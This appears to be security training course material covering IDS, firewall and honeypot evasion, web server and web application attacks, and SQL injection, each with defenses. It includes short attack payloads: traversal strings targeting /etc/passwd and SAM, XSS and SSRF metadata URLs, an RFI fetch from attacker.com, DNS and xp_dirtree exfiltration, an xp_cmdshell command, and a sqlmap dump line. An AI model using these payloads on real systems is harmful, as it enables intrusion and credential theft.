modules.title: Evading IDS, Firewalls, and Honeypots
modules.description: Explains how intrusion detection systems, firewalls, and honeypots work, and covers various evasion techniques used by attackers to bypass these security controls.
objectives: Understand IDS, IPS, and firewall architectures and detection methods
Perform IDS evasion using fragmentation, obfuscation, encryption, and desynchronization
Bypass firewall rules using tunneling, covert channels, and source routing
Identify and evade honeypots and honeynets
Understand NAC and endpoint security evasion

topics.title: 1. Intrusion Detection Systems (IDS) vs Intrusion Prevention Systems (IPS)
topics.content:
Core Functions

Security monitoring appliances are critical for detecting malicious activity.

  • Intrusion Detection System (IDS): An IDS is a passive monitoring system. It analyzes network traffic or host activities to identify suspicious patterns, policy violations, or known threats. When a threat is detected, it generates an alert (logging, email, dashboard notification) but does not actively block the traffic. Because it operates out-of-band, its failure does not disrupt network traffic.
  • Intrusion Prevention System (IPS): An IPS is an active device that sits inline (in the direct path of network traffic). It performs the same analysis as an IDS but has the capability to actively drop malicious packets, reset connections, or block IP addresses in real-time. If an IPS fails closed, it can disrupt all network traffic.

topics.title: 2. Network Sensor Placement: SPAN, TAP, and In-line
topics.content:
Visibility and Architecture

The effectiveness of an IDS/IPS depends heavily on where its sensors are deployed.

  • SPAN Port (Port Mirroring): A switch is configured to send a duplicate copy of all traffic passing through it to a specific port (the SPAN port) where the IDS sensor is connected. This is out-of-band and does not impact network performance, but SPAN ports can drop packets under heavy load, causing the IDS to miss attacks.
  • Network TAP (Test Access Point): A physical hardware device inserted directly into a network cable. It creates a flawless, 100% copy of all traffic for the IDS. TAPs are highly reliable and invisible to the network, but require brief network downtime to install.
  • In-line Placement: Required for IPS deployments. The traffic physically flows through the appliance. It provides prevention capabilities but introduces a potential point of failure and minor latency.

topics.title: 3. Detection Methodologies: Signature vs. Anomaly-based
topics.content:
How Engines Identify Threats

IDS/IPS engines use different methodologies to classify traffic as malicious.

  • Signature-Based (Knowledge-Based): The engine compares packet contents and sequences against a database of known threat signatures (similar to antivirus definitions). It is highly accurate and fast, producing very few false positives. However, it is completely blind to new, unknown attacks (zero-days) for which no signature exists.
  • Anomaly-Based (Behavioral): The engine establishes a statistical baseline of 'normal' network behavior (e.g., typical bandwidth usage, common protocols, standard login times) over a training period. It then flags any activity that significantly deviates from this baseline as anomalous. It is capable of detecting zero-day exploits and insider threats, but is notoriously prone to high rates of false positives due to unpredictable, benign network changes.

topics.title: 4. Firewall Architectures: Stateless, Stateful, and Application Proxies
topics.content:
Filtering Mechanisms

Firewalls enforce access control policies between network segments.

  • Stateless Packet Filtering: Operates at OSI Layers 3 and 4. It examines each packet individually in isolation, checking the source/destination IP addresses, ports, and protocols against a rigid Access Control List (ACL). It does not track connection state, making it vulnerable to spoofing and fragmented attacks.
  • Stateful Inspection: A more intelligent firewall that tracks the entire state of active connections (TCP handshakes, sequence numbers) in a state table. It only allows incoming packets if they belong to an established, valid session initiated from the inside. This is the standard for modern network firewalls.
  • Application-Level Gateway (Proxy Firewall): Operates at OSI Layer 7. It terminates the client's connection, deeply inspects the application payload (e.g., HTTP requests, FTP commands), and then initiates a separate connection to the server. It provides the highest security but introduces significant latency. Web Application Firewalls (WAFs) are a specialized form of this.

topics.title: 5. Evasion Techniques: IP Fragmentation and Overlapping
topics.content:
Bypassing Deep Packet Inspection

Attackers use complex packet manipulation to confuse the IDS sensor, causing it to fail to recognize a malicious payload, while ensuring the target host successfully reassembles and executes the attack.

Fragmentation Attacks

An attacker breaks a malicious payload into extremely small IP fragments (e.g., 8-byte chunks using Nmap's -f flag). If an IDS is poorly configured or lacks the memory to buffer and reassemble a massive stream of tiny fragments, it may let them pass uninspected. The target OS, however, will reassemble the fragments and process the exploit.

Overlapping Fragments (Teardrop variants)

The attacker crafts fragments with overlapping offset values. Fragment 2 might contain data that is meant to overwrite part of Fragment 1 during reassembly. If the IDS and the target OS handle overlapping fragments differently (e.g., the IDS favors the original data, but the OS favors the overwritten data), the IDS will inspect a benign payload while the OS executes a malicious one.

topics.title: 6. Evasion Techniques: Time-To-Live (TTL) Manipulation
topics.content:
Exploiting Network Topology

TTL evasion (or insertion attacks) relies on the physical distance (hop count) between the attacker, the IDS, and the target host.

The attacker injects 'garbage' packets containing benign data into the malicious data stream. Crucially, these garbage packets are crafted with an artificially low Time-To-Live (TTL) value. The TTL is sufficient for the packet to reach the IDS (which is closer), but it expires (hits zero) and is dropped by a router before it reaches the final target host.

The IDS reassembles the stream including the garbage packets, resulting in a nonsensical payload that does not match any threat signature. The target host, however, never receives the garbage packets, successfully reassembling and executing the pure, malicious payload.

topics.title: 7. Evasion Techniques: Obfuscation, Encoding, and Encryption
topics.content:
Hiding the Payload

Attackers transform the appearance of their payloads to evade static signature matching.

  • URL Encoding: Replacing characters with their hexadecimal equivalents. For example, a path traversal attack ../../etc/passwd becomes %2e%2e%2f%2e%2e%2fetc%2fpasswd.
  • Unicode Encoding: Exploiting how different web servers interpret Unicode characters (e.g., %u002e%u002e/%u002e%u002e/etc/passwd). If the IDS does not normalize the input to the exact format the target server uses, the attack slips through.
  • Encryption: The most effective evasion technique. If the attacker establishes an encrypted C2 channel (e.g., via HTTPS, SSH, or custom encrypted payloads), the IDS can only see encrypted cipher text. Unless the IDS acts as an SSL interceptor (terminating and decrypting traffic), it cannot inspect the payload.

topics.title: 8. Evasion Techniques: Polymorphic Shellcode
topics.content:
Defeating Signature-Based Detection

Traditional malware and exploits contain fixed sequences of bytes that IDS systems use as signatures. Polymorphic Shellcode is a technique where the exploit payload is heavily encoded or encrypted, and a small, dynamic 'decoder stub' is prepended to it.

Crucially, the encoding algorithm and the decoder stub are generated dynamically every single time the exploit is launched. The resulting byte sequence is completely different for every attack instance, meaning no two payloads share the same signature. This renders signature-based IDS completely ineffective. The decoder stub executes in memory, decrypts the true malicious payload, and executes it on the target.

topics.title: 9. Firewall Bypassing: Port Forwarding and SSH Tunneling
topics.content:
Tunneling Traffic

When a firewall blocks direct inbound or outbound access to a specific port (e.g., blocking port 3389 for RDP), attackers use tunneling to encapsulate the forbidden traffic inside a permitted protocol.

SSH Tunneling (Port Forwarding)

If SSH (port 22) is allowed through the firewall, an attacker can establish an encrypted SSH connection to an external, attacker-controlled server. They can then configure Local or Remote Port Forwarding. The attacker encapsulates their RDP traffic, reverse shell, or database connections inside the encrypted SSH tunnel. The firewall only sees legitimate, encrypted SSH traffic on port 22 and allows it through, completely unaware of the malicious payloads traversing the tunnel.

topics.title: 10. Firewall Bypassing: ICMP and DNS Covert Channels
topics.content:
Exploiting Permissive Protocols

Firewalls often allow certain protocols like ICMP (Ping) or DNS to pass freely for network diagnostic and resolution purposes. Attackers exploit this leniency to create Covert Channels.

  • ICMP Tunneling: Tools like ptunnel allow an attacker to inject arbitrary data, or even a full TCP connection, directly into the data payload section of ICMP Echo Request and Echo Reply packets. To the firewall, it looks like standard ping traffic.
  • DNS Tunneling: Attackers encapsulate data within DNS queries and responses. Malware on the inside sends a DNS request for a sub-domain (e.g., <base64_encoded_stolen_data>.attacker.com). The firewall allows the query. The attacker's authoritative DNS server receives the request, extracts the stolen data, and can send commands back in the DNS response (e.g., in TXT records).

topics.title: 11. Introduction to Deception Technology: Honeypots
topics.content:
The Art of Deception

Honeypots are decoy systems, servers, or applications intentionally deployed on a network to attract attackers. They contain no legitimate production value; therefore, any connection attempt, port scan, or login attempt against a honeypot is inherently suspicious and highly indicative of malicious activity.

Purpose of Honeypots

  • Early Warning System: They provide highly accurate alerts with virtually zero false positives, as no legitimate user should ever interact with them.
  • Threat Intelligence Gathering: They capture malware samples (especially zero-days), record attacker keystrokes, and analyze post-exploitation lateral movement techniques.
  • Wasting Attacker Resources: They bog down attackers in fake environments, delaying their progress toward real production assets.

topics.title: 12. High-Interaction vs Low-Interaction Honeypots
topics.content:
Levels of Emulation

Honeypots are classified by the level of interaction they provide to the attacker.

  • Low-Interaction Honeypots: (e.g., Honeyd, KFSensor) These do not run real operating systems. They use software to emulate specific services (like faking an FTP banner or simulating an open SSH port). They are easy to deploy and carry very low risk (since there is no real OS to compromise), but they provide limited intelligence because advanced attackers quickly realize they are fake.
  • High-Interaction Honeypots: These are fully functional, real operating systems and services (e.g., a real Windows Server deployed with vulnerable services). They provide a highly realistic environment, allowing researchers to capture deep insights into rootkits and advanced exploits. However, they are resource-intensive and carry high risk; if the attacker successfully compromises the honeypot, they might use it as a pivot point to attack the real network if it isn't properly isolated.

topics.title: 13. Detecting and Evading Honeypots
topics.content:
Honeypot Fingerprinting

Sophisticated attackers actively scan for indicators of deception before deploying their most valuable exploits.

  • Virtualization Artifacts: Because deploying physical hardware for honeypots is expensive, most run in Virtual Machines (VMware, VirtualBox). Attackers check the MAC address OUI (Organizationally Unique Identifier) to see if it belongs to a VM vendor. They also search the filesystem for VM drivers (vboxguest.sys) or registry keys indicative of virtualization.
  • Absence of Legitimate Noise: A corporate server with absolutely no background network traffic, empty log files, and zero active user sessions is highly suspicious.
  • Default Configurations: Attackers look for specific open ports associated with honeypot management consoles or recognizable default banners generated by low-interaction emulators.

modules.title: Hacking Web Servers
modules.description: Covers web server architectures, common vulnerabilities, attack techniques including directory traversal, misconfiguration exploitation, and web server hardening best practices.
objectives: Understand web server architecture and common platforms (Apache, IIS, Nginx)
Identify web server vulnerabilities and misconfigurations
Perform directory traversal and web server exploitation
Use web server scanning tools for vulnerability assessment
Implement web server hardening countermeasures

topics.title: 1. Web Server Architecture and the HTTP Lifecycle
topics.content:
The Foundation of the Web

Web servers are the specialized software (and underlying hardware) responsible for handling HTTP and HTTPS requests from clients (browsers). They process these requests, interact with backend application servers and databases if necessary, and return the appropriate HTTP responses containing HTML, images, or JSON data.

The three dominant web server platforms are:

  • Apache HTTP Server: Open-source, highly configurable via .htaccess files, and historically the most widely used on Linux environments.
  • Microsoft Internet Information Services (IIS): Proprietary server tightly integrated into the Windows Server operating system.
  • Nginx: Designed for high concurrency and performance, frequently used as a reverse proxy, load balancer, and static content server.

Due to their complexity, extensive feature sets, and requirement to be publicly accessible on the internet, web servers represent a massive attack surface.

topics.title: 2. Identifying Misconfigurations and Information Disclosure
topics.content:
The Danger of Defaults

One of the most prevalent web server vulnerabilities is Security Misconfiguration. Administrators often deploy servers rapidly using default settings, leaving them exposed.

  • Default Credentials & Admin Panels: Leaving default passwords on administrative interfaces (e.g., Tomcat Manager, Jenkins, router web interfaces) allows trivial complete compromise.
  • Sample Files and Unnecessary Modules: Default installations often include sample scripts that contain known vulnerabilities or modules (like WebDAV) that allow unauthorized file uploads.

Information Disclosure (Banner Grabbing)

Web servers are often configured to be highly verbose. They broadcast their exact software versions in the HTTP Server header (e.g., Server: Apache/2.4.49). This intelligence allows attackers to map the server against a database of known CVEs. Furthermore, unhandled exceptions that generate detailed stack traces can reveal internal file paths, database connection strings, and backend logic to the attacker.

topics.title: 3. Path/Directory Traversal Vulnerabilities
topics.content:
Breaking Out of the Web Root

Directory Traversal (also known as Path Traversal or the ../ attack) occurs when a web server fails to properly sanitize user input that is used to construct a file path.

Normally, a web server restricts user access to a specific directory structure known as the web root (e.g., /var/www/html/). However, if an application takes a filename as a parameter (e.g., download.php?file=report.pdf), an attacker can inject dot-dot-slash sequences to navigate up the directory tree and access sensitive operating system files located outside the web root.

Payload Example: download.php?file=../../../../etc/passwd (Linux) or ..\..\..\Windows\System32\sam (Windows).

topics.title: 4. Advanced Traversal Evasion Techniques
topics.content:
Bypassing Input Filters

When basic defense mechanisms (like stripping the exact string ../) are implemented by developers, attackers employ obfuscation techniques to bypass these weak filters:

  • Double URL Encoding: Instead of sending ../ (which is %2e%2e%2f in standard URL encoding), the attacker encodes the percent sign itself, resulting in %252e%252e%252f. If the Web Application Firewall (WAF) decodes it once (seeing harmless encoded characters) but the backend server decodes it a second time, the traversal succeeds.
  • Nested Traversal Sequences: An attacker sends ....//. If the application's filter naively searches for ../ and deletes it, the remaining outer characters collapse to form a valid ../ sequence, successfully bypassing the control.
  • Null Byte Injection: Appending a null byte (%00) acts as a string terminator in C/C++ backend systems. If an application appends a required extension (e.g., .html) to user input, the payload file=../../../etc/passwd%00 forces the system to read /etc/passwd and ignore the appended .html.

topics.title: 5. HTTP Header Manipulation: Host Header Injection
topics.content:
Exploiting Virtual Hosting

Modern web servers use virtual hosting to serve multiple websites from a single IP address. They rely on the HTTP Host header provided by the client to determine which website to serve.

If the web server fails to properly validate the Host header against a strict whitelist, attackers can manipulate it. This leads to Host Header Injection vulnerabilities.

  • Password Reset Poisoning: If the application uses the injected Host header to construct the URL for a password reset email, the attacker can force the application to send a legitimate user a password reset link pointing to the attacker's domain (e.g., https://evil.com/reset?token=123). When the victim clicks the link, the token is sent to the attacker.
  • Web Cache Poisoning: Injecting a malicious Host header can cause intermediary caching proxies (like CDNs) to cache a response generated for the attacker's domain, subsequently serving that malicious response to legitimate users accessing the real domain.

topics.title: 6. HTTP Response Splitting (CRLF Injection)
topics.content:
Manipulating Response Structures

HTTP Response Splitting occurs when an attacker can inject Carriage Return (CR, %0d) and Line Feed (LF, %0a) characters into user input that is subsequently reflected in an HTTP response header (often in a 302 Redirect Location header or a Set-Cookie header).

Because HTTP headers are separated by CRLF sequences, injecting these characters allows the attacker to prematurely terminate the headers and start a completely new, attacker-controlled HTTP response body. This essentially 'splits' the single intended response into two separate responses. This technique is frequently used to execute Cross-Site Scripting (XSS) or poison intermediary web caches.

topics.title: 7. Web Server Reconnaissance and Automated Scanning
topics.content:
Mapping the Attack Surface

Before launching exploits, attackers systematically scan the web server to identify vulnerabilities and hidden content.

  • Vulnerability Scanners (Nikto): Nikto is a classic, comprehensive web server scanner. It automatically tests for over 6,700 potentially dangerous files, checks for outdated server versions, and identifies specific configuration flaws (like multiple index files or open HTTP methods like PUT/DELETE).
  • Directory Brute Forcing (Dirb, Gobuster, Wfuzz): Attackers use these tools alongside massive wordlists to systematically guess the names of hidden directories and files that are not linked in the HTML source. This is the primary method for discovering hidden admin panels, unlinked backup files (e.g., backup.zip, config.bak), and developer test scripts that often contain fatal security flaws.

topics.title: 8. Web Server Hardening and Countermeasures
topics.content:
Defense-in-Depth for Servers

Hardening a web server requires minimizing the attack surface and enforcing strict controls.

  • Principle of Least Privilege: The web server process (e.g., Apache) should run under a dedicated, low-privilege service account (like www-data), never as root or Administrator. This limits the damage if the server is compromised via an exploit like Remote Code Execution (RCE).
  • Configuration Management: Remove all default installations, sample files, and documentation. Disable directory listing (indexing) so attackers cannot browse the file system if an index.html file is missing. Disable unnecessary HTTP methods (PUT, DELETE, TRACE).
  • Strict File Permissions: The web root should be strictly read-only for the web server process. Write permissions should only be granted to highly specific upload directories, and crucially, script execution (e.g., PHP parsing) must be disabled within those upload directories.
  • Implement Security Headers: Configure the server to return modern security headers to protect the client browser, including HSTS (forces HTTPS), X-Frame-Options (prevents Clickjacking), and Content-Security-Policy (mitigates XSS).

modules.title: Hacking Web Applications
modules.description: Deep dive into web application vulnerabilities based on the OWASP Top 10, covering XSS, CSRF, SSRF, broken authentication, file uploads, and modern web application attack techniques.
objectives: Understand the OWASP Top 10 vulnerability categories
Perform Cross-Site Scripting (XSS), CSRF, and SSRF attacks
Exploit broken authentication, IDOR, and insecure deserialization
Execute file upload and local/remote file inclusion (LFI/RFI) attacks
Implement secure coding practices and WAF protections

topics.title: 1. The OWASP Top 10 Framework Overview
topics.content:
The Industry Standard for Web Security

The Open Web Application Security Project (OWASP) Top 10 is a globally recognized awareness document that outlines the most critical security risks to web applications. It is compiled by a community of security experts based on extensive data analysis of real-world vulnerabilities.

Understanding the OWASP Top 10 is fundamental for ethical hackers, penetration testers, and developers. It serves as a prioritized checklist for assessing web application security posture. The list is periodically updated to reflect the evolving threat landscape (e.g., shifting focus toward API security, Server-Side Request Forgery, and Cryptographic Failures).

topics.title: 2. Broken Access Control and Privilege Escalation
topics.content:
Failures in Authorization

Currently ranked as a top critical risk, Broken Access Control occurs when an application fails to properly enforce policies regarding what authenticated users are permitted to do. Even if authentication (login) is secure, flawed authorization allows users to act outside their intended permissions.

Privilege Escalation

  • Vertical Privilege Escalation: A standard, low-privileged user manipulates parameters (e.g., altering a hidden form field or API payload from role=user to role=admin) to gain administrative or super-user rights over the application.
  • Horizontal Privilege Escalation: A user accesses or modifies data belonging to another user who possesses the same level of privileges. This is often achieved through Insecure Direct Object References (IDOR).

topics.title: 3. Insecure Direct Object References (IDOR) Deep Dive
topics.content:
Manipulating Object Identifiers

IDOR is a pervasive and severe access control vulnerability. It occurs when an application exposes a direct reference to an internal implementation object, such as a database record, a file, or a directory, typically via a URL parameter or API endpoint, without performing authorization checks to ensure the requesting user is allowed to access that specific object.

Exploitation Example

Consider a user viewing their own medical records via the URL: https://hospital.com/api/records?patient_id=8543.

If the application only relies on the fact that the user is logged in, but fails to verify that the logged-in user actually corresponds to patient_id 8543, an attacker can simply change the parameter: https://hospital.com/api/records?patient_id=8544.

If the application returns the highly sensitive medical records of patient 8544, an IDOR vulnerability has been successfully exploited. Defending against IDOR requires implementing robust, server-side authorization checks on every single request that accesses data, verifying ownership before returning the object.

topics.title: 4. Cross-Site Scripting (XSS): The Three Variants
topics.content:
Executing Client-Side Code

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or output escaping. This allows attackers to inject malicious scripts (usually JavaScript) into the victim's browser. The browser executes the script because it seemingly originates from a trusted source (the vulnerable website).

The Three Main Types of XSS

  1. Stored (Persistent) XSS: The most devastating variant. The malicious payload is permanently saved on the target server (e.g., in a database via a forum post, a user profile comment, or a product review). Every time any user views the affected page, the payload is served and executed automatically. No social engineering is required.
  2. Reflected (Non-Persistent) XSS: The injected script is reflected off the web server immediately in an HTTP response. This typically occurs in search fields or error messages. It requires social engineering; the attacker must trick the victim into clicking a specially crafted URL containing the payload (e.g., http://site.com/search?q=<script>alert(1)</script>).
  3. DOM-based XSS: The vulnerability exists entirely within the client-side code (JavaScript) rather than the server-side code. The payload is executed as a result of modifying the Document Object Model (DOM) environment in the victim's browser, often involving sources like window.location and execution sinks like innerHTML or eval().

topics.title: 5. Exploiting XSS and Defenses
topics.content:
Impact of XSS

While an alert box is the classic Proof of Concept, actual XSS exploitation is severe. Attackers use it to:

  • Steal Session Cookies: Accessing document.cookie and sending it to an attacker-controlled drop server, leading to full session hijacking.
  • Perform Actions on Behalf of the User: The script can make authenticated XMLHttpRequest (AJAX) calls to change passwords, transfer funds, or grant permissions without the user's knowledge.
  • Website Defacement and Phishing: Modifying the DOM to display fake login forms to steal credentials or redirecting the browser to malicious exploit kits.

Defending Against XSS

The primary defense against XSS is Context-Aware Output Encoding. This ensures that when user input is displayed, the browser interprets it safely as text content, not as executable code (e.g., converting < to <). Secondary defenses include implementing a strict Content Security Policy (CSP) to restrict where scripts can load from, and setting the HttpOnly flag on session cookies to prevent theft.

topics.title: 6. Cross-Site Request Forgery (CSRF)
topics.content:
The Confused Deputy Problem

CSRF forces an authenticated, logged-in victim's browser to execute an unwanted, malicious action on a trusted web application. It exploits the fact that browsers automatically include session cookies with every request made to a domain.

Attack Mechanics

An attacker crafts a malicious link or hidden HTML form on a site they control. This form targets a state-changing action on the vulnerable application (e.g., https://bank.com/transfer?amount=10000&to=AttackerAccount). If the victim is currently logged into bank.com in another tab, and visits the attacker's site, the attacker's site uses JavaScript to silently submit the form. The victim's browser automatically attaches the valid session cookie for bank.com. The bank's server receives a structurally valid request with a valid cookie and executes the transfer, completely unaware it was initiated maliciously.

CSRF Defenses

The standard defense is the implementation of Anti-CSRF Tokens (Synchronizer Token Pattern). The server generates a unique, unpredictable cryptographic token and includes it in all state-changing forms. When the form is submitted, the server verifies that the submitted token matches the token stored in the user's session. Since the attacker cannot read this token from the victim's session due to the Same-Origin Policy, they cannot forge a valid request. Modern defenses also heavily rely on the SameSite cookie attribute.

topics.title: 7. Server-Side Request Forgery (SSRF)
topics.content:
Attacking from the Inside Out

In an SSRF attack, the attacker abuses the functionality of a web application to force the server itself to make arbitrary HTTP requests on their behalf. This is extremely dangerous because the server often has access to internal networks, databases, and cloud metadata services that are completely inaccessible from the external internet.

Exploitation Vectors

  • Internal Network Scanning: The attacker provides a URL pointing to internal IP addresses (e.g., http://192.168.1.5:8080/admin). The server makes the request and returns the result to the attacker, allowing them to port scan the internal LAN and access internal admin panels.
  • Cloud Metadata Exfiltration: In cloud environments (AWS, Azure, GCP), virtual machines can access highly sensitive metadata endpoints (e.g., http://169.254.169.254/latest/meta-data/iam/security-credentials/ in AWS). An SSRF vulnerability allows an attacker to force the server to query this endpoint, returning the temporary IAM administrative credentials of the server itself, leading to total cloud environment compromise.

topics.title: 8. File Upload Vulnerabilities and LFI/RFI
topics.content:
The Risks of User Uploads

Allowing users to upload files is inherently risky. If an application fails to rigorously validate the uploaded file's extension, content-type, and actual contents, attackers can upload malicious executable scripts (e.g., a PHP webshell). Once uploaded, if the attacker can navigate to the file, the server will execute it, resulting in Remote Code Execution (RCE).

File Inclusion Vulnerabilities

File inclusion occurs when an application dynamically includes a file or script based on user input without proper validation.

  • Local File Inclusion (LFI): The attacker manipulates a parameter to include a file already present on the local server filesystem. For example, page=../../../../etc/passwd. While this is similar to directory traversal, LFI often results in the server attempting to execute the included file, leading to RCE if the attacker can upload a malicious payload or inject code into server log files (Log Poisoning).
  • Remote File Inclusion (RFI): The application is misconfigured (e.g., allow_url_include=On in PHP) to accept remote URLs as input. The attacker provides a URL pointing to a malicious script hosted on their own server (page=http://attacker.com/evil.php). The target server downloads and executes the remote script, granting immediate RCE.

modules.title: SQL Injection
modules.description: Comprehensive coverage of SQL Injection techniques, including in-band, blind, and out-of-band methods, database enumeration, data extraction, and mitigation strategies using parameterized queries.
objectives: Understand relational databases and fundamental SQL syntax
Identify SQL Injection vulnerabilities in web applications
Execute In-Band (Error and Union-based) SQL Injection attacks
Perform Inferential (Blind Boolean and Time-based) SQL Injection
Use SQLmap for automated exploitation and database takeover
Implement strong defenses including parameterized queries and prepared statements

topics.title: 1. Introduction to Databases and the SQLi Vulnerability
topics.content:
The Role of Relational Databases

Modern web applications rely heavily on relational databases (like MySQL, PostgreSQL, Microsoft SQL Server, and Oracle) to store dynamic content, user credentials, financial data, and application configurations. Applications communicate with these databases using Structured Query Language (SQL).

Anatomy of a SQL Injection

SQL Injection (SQLi) is an injection attack wherein an attacker can execute malicious SQL statements that control a web application's database server. The vulnerability occurs when user-supplied input is directly concatenated into a dynamic SQL query string without proper sanitization, escaping, or parameterization.

For example, a vulnerable login query might look like:
SELECT * FROM users WHERE username = '" + userInput + "' AND password = '" + passwordInput + "'

If an attacker inputs admin' OR '1'='1 as the username and comments out the rest of the query (e.g., using --), the executed query becomes:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = ''

Since '1'='1' is always true, the database evaluates the entire WHERE clause as true, bypassing the password check and logging the attacker in as the admin user.

topics.title: 2. In-Band SQL Injection (Error and UNION-Based)
topics.content:
Direct Data Extraction

In-band SQLi is the most straightforward classification. The attacker uses the same communication channel (the web page response) to launch the attack and gather the results.

Error-Based SQLi

This technique relies on the application returning detailed, verbose database error messages to the browser. The attacker intentionally inputs malformed SQL syntax (like an unclosed single quote '). The resulting error message often reveals the underlying database type (e.g., MySQL syntax error), table names, or even specific column data, providing crucial reconnaissance information.

UNION-Based SQLi

This is a powerful technique for extracting massive amounts of data. It uses the SQL UNION operator to combine the results of the original, legitimate query with the results of an injected, malicious query. The combined results are then displayed on the web page.

To successfully use UNION, two rules must be met: the injected query must return the exact same number of columns as the original query, and the data types of those columns must be compatible. Attackers often use the ORDER BY clause to systematically determine the number of columns before executing the UNION SELECT statement to dump data from other tables (like user passwords).

topics.title: 3. Inferential (Blind) SQL Injection
topics.content:
Extracting Data in the Dark

In many modern applications, generic error messages are used, and database results are not directly displayed on the page. In these scenarios, attackers must use Blind (Inferential) SQL Injection. Since they cannot see the data directly, they extract it by asking the database a series of True/False questions and inferring the answer based on the application's response.

Boolean-Based Blind SQLi

The attacker injects a SQL condition (e.g., AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'a'). If the condition is True, the web page loads normally. If it is False, the page might be missing content or return a slightly different HTTP status. By systematically iterating through characters and observing these subtle differences, the attacker can extract the entire password hash, character by character.

Time-Based Blind SQLi

When the application does not change its output at all based on True/False conditions, the attacker uses time-delay functions (like SLEEP(10) in MySQL or WAITFOR DELAY '0:0:10' in MSSQL). The injected query dictates: "If the first letter of the admin password is 'a', pause the database for 10 seconds before responding; otherwise, respond immediately." By measuring the time it takes the server to respond, the attacker infers the data.

topics.title: 4. Out-of-Band (OOB) SQL Injection
topics.content:
Exfiltration via Alternative Channels

Out-of-Band (OOB) SQLi is utilized when neither in-band nor blind techniques are effective (e.g., the query is executed asynchronously in the background, or severe network restrictions prevent direct inference). It relies on the database server's ability to initiate external network connections.

The attacker injects a SQL command that forces the database server to perform a DNS lookup or make an HTTP request to an external server controlled by the attacker. The extracted data is appended to this external request. For example, in Microsoft SQL Server, the master..xp_dirtree stored procedure can be abused to force the server to resolve a domain like <stolen_password_hash>.attacker.com. The attacker checks their DNS logs to retrieve the exfiltrated hash.

topics.title: 5. Advanced Exploitation: OS Command Execution
topics.content:
From Database to Server Compromise

A severe consequence of SQL Injection is the potential to escalate privileges from database access to full Operating System Command Execution. This effectively grants the attacker a remote shell on the database server.

In Microsoft SQL Server, this is famously achieved using the xp_cmdshell extended stored procedure. If the application connects to the database using an account with sufficient privileges (e.g., sa), an attacker can use SQLi to re-enable xp_cmdshell (which is disabled by default in modern versions) and execute arbitrary Windows command-line instructions directly on the underlying host OS.

Example: EXEC master..xp_cmdshell 'ping attacker.com'

topics.title: 6. Automated Exploitation: Introduction to SQLmap
topics.content:
Automating the Attack

While manual SQLi is critical for understanding the vulnerability, in practice, attackers and penetration testers rely heavily on automated tools. SQLmap is the industry-standard, open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers.

SQLmap Capabilities

SQLmap features a powerful detection engine and supports all major injection techniques (Boolean-blind, time-based blind, error-based, UNION query, and stacked queries). It can automatically fingerprint the backend database management system, extract database schemas, dump tables, crack password hashes using dictionary attacks, and, in certain conditions, upload/download files from the underlying file system and execute arbitrary OS commands.

Example usage to dump a database: sqlmap -u "http://vulnerable.site/page.php?id=1" --dbs --dump

topics.title: 7. SQL Injection Defenses: Parameterized Queries
topics.content:
The Ultimate Mitigation Strategy

The only foolproof defense against all forms of SQL Injection is to fundamentally change how database queries are constructed. Applications must never concatenate raw user input into dynamic SQL strings.

Parameterized Queries (Prepared Statements)

This is the primary defense mechanism. When using parameterized queries (or prepared statements), the developer defines the SQL query structure first, using placeholders (e.g., ? or named parameters) for the user input.

The query structure and the user-supplied data are sent to the database server separately. The database compiles the query structure independently and then treats the user input strictly as literal values (data), not as executable code. Even if the user inputs ' OR 1=1 --, the database simply searches for a user whose literal username is exactly that string. The attack payload is completely neutralized.

topics.title: 8. Additional Defenses: Stored Procedures and Escaping
topics.content:
Defense-in-Depth for Databases

  • Stored Procedures: Similar to parameterized queries, stored procedures encapsulate the SQL logic on the database server itself. The application only calls the procedure name and passes parameters. However, if the stored procedure itself uses dynamic SQL concatenation internally, it remains vulnerable.
  • Input Validation and Escaping: While not a primary defense against SQLi (parameterization is required), validating input against strict allow-lists (e.g., ensuring an age field only contains integers) adds a layer of defense. Escaping routines (like mysqli_real_escape_string in PHP) neutralize specific special characters, but are prone to bypasses if character encoding is mishandled.
  • Principle of Least Privilege: The application should connect to the database using an account with the absolute minimum privileges necessary. It should only have access to required tables and should never possess administrative rights (like sa or root) or the ability to execute OS commands or drop tables.
